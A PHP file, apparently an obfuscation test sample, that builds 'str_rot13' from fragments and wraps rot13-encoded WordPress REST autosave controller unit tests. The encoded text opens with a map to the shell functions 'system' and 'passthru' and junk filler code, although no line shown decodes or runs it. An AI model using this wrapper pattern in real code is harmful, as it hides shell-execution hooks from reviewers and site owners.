<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Nhgbfnirf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv-nhgbfnir
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Nhgbfnirf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Cbfg_Glcr_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $cbfg_vq;
	cebgrpgrq fgngvp $cntr_vq;
	cebgrpgrq fgngvp $qensg_cntr_vq;

	cebgrpgrq fgngvp $nhgbfnir_cbfg_vq;
	cebgrpgrq fgngvp $nhgbfnir_cntr_vq;

	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $pbagevohgbe_vq;

	cebgrpgrq fgngvp $cnerag_cntr_vq;
	cebgrpgrq fgngvp $puvyq_cntr_vq;
	cebgrpgrq fgngvp $puvyq_qensg_cntr_vq;

	cevingr $cbfg_nhgbfnir;

	cebgrpgrq shapgvba frg_cbfg_qngn( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'gvgyr'   => 'Cbfg Gvgyr',
			'pbagrag' => 'Cbfg pbagrag',
			'rkprecg' => 'Cbfg rkprecg',
			'anzr'    => 'grfg',
			'nhgube'  => trg_pheerag_hfre_vq(),
		);

		erghea jc_cnefr_netf( $netf, $qrsnhygf );
	}

	cebgrpgrq shapgvba purpx_perngr_nhgbfnir_erfcbafr( $erfcbafr ) {
		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'pbagrag', $qngn );
		$guvf->nffregNeenlUnfXrl( 'rkprecg', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn );
	}

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = $snpgbel->cbfg->perngr();
		frys::$cntr_vq = $snpgbel->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );

		frys::$rqvgbe_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Perngr na nhgbfnir.
		frys::$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf orggre.',
				'cbfg_VQ'      => frys::$cbfg_vq,
				'cbfg_glcr'    => 'cbfg',
			)
		);

		frys::$nhgbfnir_cntr_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf orggre.',
				'cbfg_VQ'      => frys::$cntr_vq,
				'cbfg_glcr'    => 'cbfg',
			)
		);

		frys::$qensg_cntr_vq       = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'qensg',
			)
		);
		frys::$cnerag_cntr_vq      = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		frys::$puvyq_cntr_vq       = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => frys::$cnerag_cntr_vq,
			)
		);
		frys::$puvyq_qensg_cntr_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => frys::$cnerag_cntr_vq,
				// Gur \"hcqngr cbfg\" orunivbe bs gur nhgbfnir raqcbvag bayl bpphef
				// jura fnivat n qensg/nhgb-qensg nhguberq ol gur pheerag hfre.
				'cbfg_fgnghf' => 'qensg',
				'cbfg_nhgube' => frys::$rqvgbe_vq,
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		// Nyfb qryrgrf erivfvbaf.
		jc_qryrgr_cbfg( frys::$cbfg_vq, gehr );
		jc_qryrgr_cbfg( frys::$cntr_vq, gehr );

		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		frys::qryrgr_hfre( frys::$pbagevohgbe_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$guvf->cbfg_nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cbfgf/(?C<vq>[\q]+)/nhgbfnirf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cbfgf/(?C<cnerag>[\q]+)/nhgbfnirf/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cntrf/(?C<vq>[\q]+)/nhgbfnirf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cntrf/(?C<cnerag>[\q]+)/nhgbfnirf/(?C<vq>[\q]+)', $ebhgrf );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {

		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rqvg', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );

		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rqvg', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'pbagrkg',
				'cnerag',
			),
			$xrlf
		);
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 1, $qngn );

		$guvf->nffregFnzr( frys::$nhgbfnir_cbfg_vq, $qngn[0]['vq'] );

		$guvf->purpx_trg_nhgbfnir_erfcbafr( $qngn[0], $guvf->cbfg_nhgbfnir );
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_nhgbfnirf_qngn() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );

		$ubbx_anzr = 'erfg_cercner_nhgbfnir';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );

		$guvf->nffregAbgJCReebe( $erfcbafr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401 );
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_zvffvat_cnerag( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_cnerag_cbfg_glcr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cntr_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->purpx_trg_nhgbfnir_erfcbafr( $erfcbafr, $guvf->cbfg_nhgbfnir );
		$svryqf = neenl(
			'nhgube',
			'qngr',
			'qngr_tzg',
			'vq',
			'zrgn',
			'zbqvsvrq',
			'zbqvsvrq_tzg',
			'cnerag',
			'fyht',
			'thvq',
			'gvgyr',
			'rkprecg',
			'pbagrag',
		);
		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn ) );
		$guvf->nffregFnzr( frys::$rqvgbe_vq, $qngn['nhgube'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );

		$ubbx_anzr = 'erfg_cercner_nhgbfnir';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	choyvp shapgvba grfg_trg_vgrz_rzorq_pbagrkg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rzorq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$svryqf   = neenl(
			'nhgube',
			'qngr',
			'vq',
			'cnerag',
			'fyht',
			'gvgyr',
			'rkprecg',
		);
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn ) );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_zvffvat_cnerag( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cnerag_cbfg_glcr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cntr_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf/' . frys::$nhgbfnir_cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->purpx_trg_nhgbfnir_erfcbafr( $erfcbafr, $guvf->cbfg_nhgbfnir );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 14, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rkprecg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'thvq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cerivrj_yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );

		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq' => frys::$cbfg_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_nhgbfnir_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );

		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'     => frys::$cbfg_vq,
				'nhgube' => frys::$pbagevohgbe_vq,
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_nhgbfnir_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_zrgn() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		ertvfgre_cbfg_zrgn(
			'cbfg',
			'sbb',
			neenl(
				'fubj_va_erfg'      => gehr,
				'erivfvbaf_ranoyrq' => gehr,
				'fvatyr'            => gehr,
			)
		);
		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'     => frys::$cbfg_vq,
				'nhgube' => frys::$pbagevohgbe_vq,
				'zrgn'   => neenl(
					'sbb' => 'one',
				),
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_nhgbfnir_erfcbafr( $erfcbafr );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );
		$guvf->nffregNeenlUnfXrl( 'sbb', $qngn['zrgn'] );
		$guvf->nffregFnzr( 'one', $qngn['zrgn']['sbb'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_wfba_zrgn() {
		$zrgn = '[{\\"pbagrag\\":\\"sbbg 1\\",\\"vq\\":\\"sn97n10q-7401-42o9-np54-qs8s4510749n\\"},{\\"pbagrag\\":\\"sqqqqqbbg 2\\\\"\\",\\"vq\\":\\"2216q0nn-34o8-42o4-o441-84qrqp0406r0\\"}]';
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		ertvfgre_cbfg_zrgn(
			'cbfg',
			'sbb',
			neenl(
				'fubj_va_erfg'      => gehr,
				'erivfvbaf_ranoyrq' => gehr,
				'fvatyr'            => gehr,
			)
		);
		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'     => frys::$cbfg_vq,
				'nhgube' => frys::$pbagevohgbe_vq,
				'zrgn'   => neenl(
					'sbb' => $zrgn,
				),
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_nhgbfnir_erfcbafr( $erfcbafr );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );
		$guvf->nffregNeenlUnfXrl( 'sbb', $qngn['zrgn'] );
		$inyhrf = wfba_qrpbqr( jc_hafynfu( $qngn['zrgn']['sbb'] ), gehr );
		$guvf->nffregAbgAhyy( $inyhrf );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_abcevi() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );

		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'     => frys::$cbfg_vq,
				'nhgube' => frys::$rqvgbe_vq,
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_erfg_nhgbfnir_choyvfurq_cbfg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );

		$pheerag_cbfg = trg_cbfg( frys::$cbfg_vq );

		$nhgbfnir_qngn = $guvf->frg_cbfg_qngn(
			neenl(
				'vq'      => frys::$cbfg_vq,
				'pbagrag' => 'Hcqngrq cbfg \ pbagrag',
				'rkprecg' => $pheerag_cbfg->cbfg_rkprecg,
				'gvgyr'   => $pheerag_cbfg->cbfg_gvgyr,
			)
		);

		$erdhrfg->frg_obql( jc_wfba_rapbqr( $nhgbfnir_qngn ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $pheerag_cbfg->VQ, $arj_qngn['cnerag'] );
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_gvgyr, $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $pheerag_cbfg->cbfg_rkprecg, $arj_qngn['rkprecg']['enj'] );

		// Hcqngrq cbfg_pbagrag.
		$guvf->nffregAbgRdhnyf( $pheerag_cbfg->cbfg_pbagrag, $arj_qngn['pbagrag']['enj'] );

		$nhgbfnir_cbfg = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );
		$guvf->nffregFnzr( $nhgbfnir_qngn['gvgyr'], $nhgbfnir_cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $nhgbfnir_qngn['pbagrag'], $nhgbfnir_cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $nhgbfnir_qngn['rkprecg'], $nhgbfnir_cbfg->cbfg_rkprecg );
	}

	choyvp shapgvba grfg_erfg_nhgbfnir_qensg_cbfg_fnzr_nhgube() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_qngn = neenl(
			'cbfg_pbagrag' => 'Grfg cbfg pbagrag',
			'cbfg_gvgyr'   => 'Grfg cbfg gvgyr',
			'cbfg_rkprecg' => 'Grfg cbfg rkprecg',
		);
		$cbfg_vq   = jc_vafreg_cbfg( $cbfg_qngn );

		$nhgbfnir_qngn = neenl(
			'vq'      => $cbfg_vq,
			'pbagrag' => 'Hcqngrq cbfg \ pbagrag',
			'gvgyr'   => 'Hcqngrq cbfg gvgyr',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/nhgbfnirf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $nhgbfnir_qngn ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$arj_qngn = $erfcbafr->trg_qngn();
		$cbfg     = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $cbfg_vq, $arj_qngn['vq'] );
		// Gur qensg cbfg fubhyq or hcqngrq.
		$guvf->nffregFnzr( $nhgbfnir_qngn['pbagrag'], $arj_qngn['pbagrag']['enj'] );
		$guvf->nffregFnzr( $nhgbfnir_qngn['gvgyr'], $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $nhgbfnir_qngn['pbagrag'], $cbfg->cbfg_pbagrag );
